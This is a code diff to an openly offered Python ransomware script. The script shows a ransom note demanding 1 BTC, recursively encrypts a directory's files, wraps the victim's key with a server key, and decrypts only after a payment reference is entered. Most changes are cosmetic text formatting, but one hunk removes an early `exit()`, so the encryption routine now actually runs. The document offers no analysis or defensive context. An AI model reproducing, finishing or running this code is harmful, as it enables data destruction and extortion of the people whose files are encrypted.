@@ -145,13 +145,13 @@ def decrypt_files(file_path, private_key):
     os.remove(file_path)
 
 def ransomware():
-    text1 = "☠️☠️☠️☠️☠️☠️☠️☠️☠️"
+    text1 = "☠️  ☠️  ☠️  ☠️  ☠️  ☠️  ☠️  ☠️  ☠️  "
     text2 = "\033[31mYOUR FILES ARE ENCRYPTED\033[0m"
     text3 = "All your files have been encrypted due to a security problem with your PC"
     text4 = "If you want to restore them, send 1 BTC to <random_BTC_address>"
     text5 = "\033[33mATTENTION\033[0m"
-    text6 = ("☠️ Do not rename encrypted files.")
-    text7 = ("☠️ Do not try to decrypt your data using third party software, it may cause permanent data loss.")
+    text6 = ("☠️  Do not rename encrypted files.")
+    text7 = ("☠️  Do not try to decrypt your data using third party software, it may cause permanent data loss.")
 
     # Get the width of the terminal window
     term_width, _ = shutil.get_terminal_size()
@@ -173,12 +173,11 @@ def ransomware():
     print(centered_text4)
     print("\n")
     print(centered_text5)
-    print("\n")
+    # print("\n")
     print(centered_text6)
     print(centered_text7)
     print("\n")
 
-    exit()
     # generate client's private and public key if it is not already generated
     if not os.path.isfile(CLIENT_PRIVATE_KEY_FILE_NAME):
         client_private_key, client_public_key = generate_keys()
@@ -187,7 +186,7 @@ def ransomware():
         for item in scan_recurse(DIRECTORY): 
             file_path = Path(item)
             encrypt_files(file_path, client_public_key)
-        print("Encrypted files successfully")
+        # print("Encrypted all the files")
 
         # get server's public key
         server_public_key = get_server_public_key()
@@ -198,8 +197,6 @@ def ransomware():
         # save encrypted data to file
         with open(CLIENT_PRIVATE_KEY_FILE_NAME, 'wb') as f:
             f.write(client_private_key_enc)
-
-        print("\033[31mYou have been HACKED \033[0m")
     
     # verify ransom reference number
     reference_num = input("Enter payment reference number: ")
@@ -210,7 +207,7 @@ def ransomware():
 
         # decrypt the encrypted client's private key
         client_private_key = decrypt_client_private_key(client_private_key_enc.decode())
-        print("Called API and decrypted private key")
+        # print("Called API and decrypted private key")
 
         # loop through the direrctory and decrypt files
         for item in scan_recurse(DIRECTORY): 
@@ -222,11 +219,19 @@ def ransomware():
 
         # delete the file containing client's encrypted private key
         os.remove(CLIENT_PRIVATE_KEY_FILE_NAME)
-        red_text = "\033[31mThis text is red\033[0m"
-        print(red_text)
-        print("Decrypted files successfully")
+        
+        text8 = "\033[32mYour files have been decrypted\033[0m"
+        print("\n")
+        centered_text8 = text8.center(term_width)
+        print(centered_text8)
+        print("\n")
+
     else:
-        print("Invalid reference number")
+        print("\n")
+        text9 = "\033[31mInvalid reference number\033[0m"
+        centered_text9 = text9.center(term_width)
+        print(centered_text9)
+        print("\n")
 
     return
     
